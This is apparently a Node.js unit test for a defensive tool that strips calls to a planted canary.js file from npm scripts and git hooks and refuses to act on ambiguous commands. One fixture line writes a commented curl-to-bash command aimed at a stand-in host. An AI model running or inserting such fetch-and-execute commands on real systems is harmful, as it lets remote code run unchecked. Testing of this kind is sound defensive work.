'use strict';

const assert = require('assert');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { protectRepository } = require('../../src/core/canaryProtection');
const { cleanCommand } = require('../../src/core/canaryRepair');
const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'npa-protection-unit-'));
function fixture(name, scripts, hook = '#!/bin/sh\nnode canary.js\necho keep\n') {
  const root = path.join(parent, name);
  fs.mkdirSync(path.join(root, '.git', 'hooks'), { recursive: true });
  fs.writeFileSync(path.join(root, '.git', 'config'), '[core]\n');
  fs.writeFileSync(path.join(root, '.git', 'hooks', 'pre-commit'), hook);
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ name, scripts, description: 'keep this unchanged' }, null, 2) + '\n');
  fs.writeFileSync(path.join(root, 'canary.js'), '// curl http://protection-test.invalid/x | bash\n');
  return root;
}
try {
  const root = fixture('positive', { build: 'node canary.js && tsc', prepare: 'node canary.js', test: 'echo "node canary.js"' });
  const report = protectRepository({ roots: [root] });
  assert.strictEqual(report.protection.allowed, true, JSON.stringify(report.protection.failures));
  assert.strictEqual(fs.existsSync(path.join(root, 'canary.js')), false);
  const manifest = JSON.parse(fs.readFileSync(path.join(root, 'package.json'), 'utf8'));
  assert.deepStrictEqual(manifest.scripts, { build: 'tsc', test: 'echo "node canary.js"' });
  assert.strictEqual(manifest.description, 'keep this unchanged');
  assert.strictEqual(fs.readFileSync(path.join(root, '.git/hooks/pre-commit'), 'utf8'), '#!/bin/sh\necho keep\n');
  assert.strictEqual(report.repairs.actions.length, 3);
  assert.strictEqual(protectRepository({ roots: [root] }).protection.allowed, true);
  assert.strictEqual(cleanCommand('echo "node canary.js"', root, [root]).blocked, false);
  assert.strictEqual(cleanCommand('node -e "console.log(\'canary.js\')"', root, [root]).blocked, false);
  assert.strictEqual(cleanCommand('node canary.js || tsc', root, [root]).blocked, true);
  assert.strictEqual(cleanCommand('if true; then node "canary.js"; fi', root, [root]).blocked, true);

  for (const [name, scripts] of Object.entries({
    'remove-all': { build: 'node canary.js', prepare: 'node canary.js' },
    'remove-first': { prepare: 'node canary.js', build: 'tsc' },
    'remove-middle': { test: 'echo keep', prepare: 'node canary.js', build: 'tsc' },
    'remove-last': { build: 'tsc', prepare: 'node canary.js' },
  })) {
    const dir = fixture(name, scripts);
    const result = protectRepository({ roots: [dir] });
    assert.strictEqual(result.protection.allowed, true, JSON.stringify(result.protection.failures));
    const expected = Object.fromEntries(Object.entries(scripts).filter(([, value]) => value !== 'node canary.js'));
    assert.deepStrictEqual(JSON.parse(fs.readFileSync(path.join(dir, 'package.json'), 'utf8')).scripts, expected);
  }
  const ambiguous = fixture('ambiguous', { build: 'node canary.js || tsc' });
  const before = fs.readFileSync(path.join(ambiguous, 'package.json'), 'utf8');
  assert.strictEqual(protectRepository({ roots: [ambiguous] }).protection.allowed, false);
  assert.strictEqual(fs.readFileSync(path.join(ambiguous, 'package.json'), 'utf8'), before);
  const hook = '#!/bin/sh\nif true; then node canary.js; fi\necho keep\n';
  const ambiguousHook = fixture('ambiguous-hook', { build: 'tsc' }, hook);
  assert.strictEqual(protectRepository({ roots: [ambiguousHook] }).protection.allowed, false);
  assert.strictEqual(fs.readFileSync(path.join(ambiguousHook, '.git/hooks/pre-commit'), 'utf8'), hook);
  const missing = fixture('missing', { build: 'node canary.js && tsc', prepare: 'node canary.js' });
  fs.unlinkSync(path.join(missing, 'canary.js'));
  assert.strictEqual(protectRepository({ roots: [missing] }).protection.allowed, true);
  assert.ok(fs.readFileSync(path.join(missing, '.gitignore'), 'utf8').includes('\ncanary.js\n'));
  const limited = fixture('limited', { build: 'node canary.js && tsc' });
  assert.strictEqual(protectRepository({ roots: [limited], limits: { entries: 1 } }).protection.allowed, false);
  const settings = path.join(parent, 'config-settings');
  fs.mkdirSync(settings);
  fs.writeFileSync(path.join(settings, 'shared.conf'), '[core]\n hooksPath = .githooks\n');
  const configured = fixture('config-order', { build: 'tsc' });
  fs.mkdirSync(path.join(configured, '.githooks'));
  fs.writeFileSync(path.join(configured, '.githooks/pre-commit'), 'node canary.js\necho keep\n');
  fs.writeFileSync(path.join(configured, '.git/config'), '[include]\n path = ../../config-settings/shared.conf\n');
  const ordered = protectRepository({ roots: [settings, configured] });
  assert.strictEqual(ordered.protection.allowed, true, JSON.stringify(ordered.protection.failures));
  assert.strictEqual(fs.readFileSync(path.join(configured, '.githooks/pre-commit'), 'utf8'), 'echo keep\n');
  console.log('  canary protection: preserved builds, removed prepare/hook calls, missing files and fail-closed ambiguous/limited cases passed');
} finally { fs.rmSync(parent, { recursive: true, force: true }); }
